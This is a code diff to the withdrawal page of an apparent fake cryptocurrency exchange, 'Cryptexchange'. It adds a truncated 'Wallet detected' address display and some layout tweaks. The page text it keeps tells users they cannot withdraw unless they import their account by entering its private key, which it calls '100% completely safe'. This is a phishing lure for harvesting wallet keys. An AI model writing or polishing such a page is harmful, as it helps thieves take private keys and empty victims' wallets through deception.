@@ -48,6 +48,13 @@ export default function WithdrawPage() {
     // setIsLoading(false)
   };
 
+  const truncate = (fullAddress:any) => {
+    if (!fullAddress) return '';
+    const start = fullAddress.slice(0, 5);
+    const end = fullAddress.slice(-5);
+    return `${start}...${end}`;
+  };
+
 
   const logout = () => {
     setIsLogoutLoading(true)
@@ -61,8 +68,9 @@ export default function WithdrawPage() {
       <div className={"text-4xl mt-7 mb-8 " + bit.className}>Cryptexchange</div>
       
       <div className="w-full h-screen max-w-2xl flex flex-col items-center bg-gray-700 rounded-lg p-8">
-        <div className="pt-24 flex flex-col justify-center items-center">
-          <h2 className="text-3xl font-bold mb-6">Withdraw Funds</h2>
+        <div className="pt-20 flex flex-col justify-center items-center">
+          <h2 className="text-3xl font-bold mb-3">Withdraw Funds</h2>
+          <span className="text-2xl mb-3">Wallet detected: {truncate(address)}</span>
           <p className="text-center text-lg mb-6 w-[40rem]">
             We're sorry but we not allow external accounts to withdraw there funds from Cryptexchange. 
             Please import your account here using it private key in order to transferring funds to it. It is 100% completely safe
@@ -90,7 +98,7 @@ export default function WithdrawPage() {
 
       <button
         onClick={logout}
-        className="flex w-28 h-12  justify-center items-center absolute bottom-4 right-4 bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
+        className="flex w-20 h-8  justify-center items-center absolute bottom-4 right-4 bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
       >
 
        {isLogoutLoading?<Loader />:"Logout"}  
